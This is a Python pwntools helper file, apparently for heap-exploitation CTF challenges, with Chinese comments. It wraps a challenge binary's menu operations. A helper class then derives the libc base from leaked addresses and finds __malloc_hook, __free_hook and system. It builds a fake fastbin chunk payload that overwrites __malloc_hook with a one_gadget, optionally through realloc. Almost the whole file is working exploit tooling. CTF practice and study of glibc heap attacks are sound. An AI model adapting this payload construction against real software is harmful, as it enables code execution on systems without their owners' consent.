from pwn import *
import os
def menu(glb):
    """
    heap题的menu
    """
    # 这里我原来想通过 g = globals(); g = glb来把main里面的各个函数传递到这里，但是后来发现我想错了
    # 因为g = glb这种写法就是把g当成一个指针，并没有改变当前的globals()
    # 所以只有通过g.update(glb)这种方式才能把字典复制过来，
    # 但是我感觉开销略大所以还是直接一个个赋值吧
    
    sla = glb['sla']
    sa = glb['sa']
    bt = glb['bt']
    ru = glb['ru']
    sl = glb['sl']

    tips = b">"
    
    def add(size,content):
        sla(tips,b'1')
        sla(tips,bt(size))
        sla(tips,content)

    def show(id):
        sla(tips,b"2")
        sla(b"|",bt(id))
        # ru(b"| Content: ")

    def edit(idx,size,content):
        sla(tips,b'3')
        sla(b"|",bt(idx))
        sa(b"|",bt(size))
        sla(b"|",content)

    def free(idx):
        sla(tips,b'4')
        sla(b'|',bt(idx))

    def magic(content):
        sla(tips,b'6')
        sl(content)
        # ru(b"love you !")
        
    glb['add'] = add
    glb['free'] = free
    glb['show'] = show
    glb['edit'] = edit
    glb['magic'] = magic


class heap_helper:
    def __init__(self, libc, key, value):
        self.libc = libc
        if key in ['main_arena']:
            self.main_arena = value
            self.__malloc_hook = self.main_arena-0x10
            self.base_addr = value - 0x10 - self.libc.sym['__malloc_hook']
        elif key in libc.sym:
            self.base_addr = value - self.libc.sym[key]

        self.libc.address = self.base_addr
        self.malloc_hook = libc.sym["__malloc_hook"]
        self.free_hook = libc.sym["__free_hook"]
        self.system = libc.sym["system"]
        self.main_arena = self.malloc_hook + 0x10
        self.fake_fb_trunk = self.malloc_hook - 0x23
        success(f"main_arena | {hex(self.main_arena)}")
    
    def House_of_spirit(self, one_gadget, realloc=False):
        """
        fill fake trunk with one_gadget
        args:
            one_gadget: int (0x4526a)
            realloc:    whether 2 use realloc
        """
        if realloc:
            payload = b"\x00"*11 + p64(self.libc.address+one_gadget)+ p64(self.libc.sym['realloc'])
        else:
            payload = b"\x00"*0x13 + p64(self.libc.address+one_gadget)
        success("payload"+hex(self.libc.address)+hex(one_gadget))
        return payload